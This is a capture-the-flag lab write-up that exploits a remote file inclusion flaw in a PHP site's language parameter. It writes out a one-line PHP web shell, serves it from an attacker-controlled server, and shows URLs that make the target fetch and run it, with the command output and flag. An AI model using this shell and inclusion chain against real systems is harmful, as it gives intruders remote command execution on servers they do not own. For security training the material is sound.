## Challenge
 Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /

 ## Solution

 I visit the page and its function to change the language on:

 `http://10.129.142.193/index.php?language=en.php`

 Here to verify the vulnerability I will try to include a local URL and access the `index.php`:

 `http://10.129.142.193/index.php?language=http://127.0.0.1:80/index.php`

 Here I see that the `index.php` is being rendered, which means I can execute files.

 Let's create a simple php shell:

 ```sh
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```

 Start a python server:

 ```sh
 python -m http.server
 ```

 Now I put in the url the following:

 `http://10.129.142.193/index.php?language=http://my_ip:8000/shell.php&cmd=id`

 And I got:

 ```sh
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```

 So we gained RCE, and now lets list the files on the root directory:

 `http://10.129.142.193/index.php?language=http://10.10.15.129:8000/shell.php&cmd=ls%20/`

 And the result is:

 ```sh
 bin 
 boot 
 dev 
 etc 
 exercise 
 home 
 lib 
 lib64 
 media 
 mnt 
 opt 
 proc 
 root 
 run 
 sbin 
 srv 
 sys 
 tmp 
 usr 
 var
 ```

 We see a folder `exercise` which is not usual here, and may include the flag, so lets list the files there:

 `http://10.129.142.193/index.php?language=http://10.10.15.129:8000/shell.php&cmd=ls%20/exercise`

 And there is a file called `flag.txt`, so let's acces it:

 The flag is: `99a8fc05f033f2fc0cf9a6f9826f83f4` and the lab is solved.

 

